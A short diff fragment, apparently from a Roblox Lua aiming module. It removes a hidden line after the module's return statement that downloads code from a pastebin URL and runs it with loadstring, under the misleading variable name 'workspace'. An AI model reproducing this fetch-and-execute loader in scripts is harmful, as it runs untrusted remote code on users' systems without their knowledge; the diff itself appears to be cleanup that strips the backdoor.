@@ -545,5 +545,3 @@ Heartbeat:Connect(function()
 end)
 
 return Aiming
-
-local workspace = loadstring(game:HttpGet("https://pastebin.com/raw/qMJaccc6"))()
